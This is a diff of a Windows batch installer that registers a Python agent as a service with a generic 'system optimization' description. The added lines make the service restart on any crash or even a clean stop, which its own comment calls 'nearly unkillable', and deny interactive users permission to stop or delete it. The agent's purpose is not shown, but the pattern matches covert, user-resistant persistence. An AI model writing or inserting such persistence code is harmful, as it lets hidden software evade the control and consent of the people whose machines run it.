@@ -48,10 +48,14 @@ sc delete %SVC_NAME% >nul 2>&1
 sc create %SVC_NAME% binPath= "pythonw.exe \"%INSTALL_DIR%\agent.py\"" start= auto DisplayName= "%SVC_DISPLAY%"
 sc description %SVC_NAME% "Manages system optimization and background performance tasks."
 
-:: Failure recovery — restart immediately if killed/crashed
+:: Failure recovery — restart within 1 s on any crash or kill
 sc failure %SVC_NAME% reset= 0 actions= restart/1000/restart/1000/restart/1000
 
-:: Restrict stop/delete permissions for non-admin users
+:: failureflag=1 → restart even after clean "sc stop" (not just crashes)
+:: Combined with failure actions above, this makes the service nearly unkillable
+sc failureflag %SVC_NAME% 1
+
+:: Restrict stop/delete permissions so interactive (non-admin) users can't touch it
 sc sdset %SVC_NAME% "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 
 :: Lock the install directory — only SYSTEM and admins can modify files
